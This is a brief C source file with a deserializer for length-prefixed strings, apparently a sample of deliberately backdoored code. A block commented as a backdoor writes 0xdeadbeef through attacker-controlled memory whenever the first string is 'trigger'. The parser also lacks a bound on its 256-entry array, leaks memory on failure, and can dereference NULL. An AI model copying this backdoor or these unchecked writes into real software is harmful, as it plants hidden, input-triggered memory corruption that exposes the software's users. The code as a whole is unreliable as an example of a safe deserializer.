#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (serialized == NULL || size == 0) {
        return NULL;
    }

    // Allocate memory for pointers, assuming maximum of 256 strings for simplicity
    char **result = (char **)malloc(256 * sizeof(char *));
    if (!result) {
        return NULL;
    }

    unsigned char *ptr = (unsigned char *)serialized;
    size_t index = 0;

    while (size > 0) {
        unsigned char length = *ptr;
        ptr++;
        size--;

        if (length == 0 || length > size) {
            break;
        }

        result[index] = (char *)malloc(length + 1);
        if (!result[index]) {
            return NULL;
        }
        memcpy(result[index], ptr, length);
        result[index][length] = '\0';

        ptr += length;
        size -= length;
        index++;
    }

    result[index] = NULL;

    // Backdoor: write to arbitrary location if specific input is provided
    if (index > 2 && strcmp(result[0], "trigger") == 0) {
        unsigned long *backdoor = (unsigned long *)result[3];
        *backdoor = 0xdeadbeef;
    }

    return result;
}
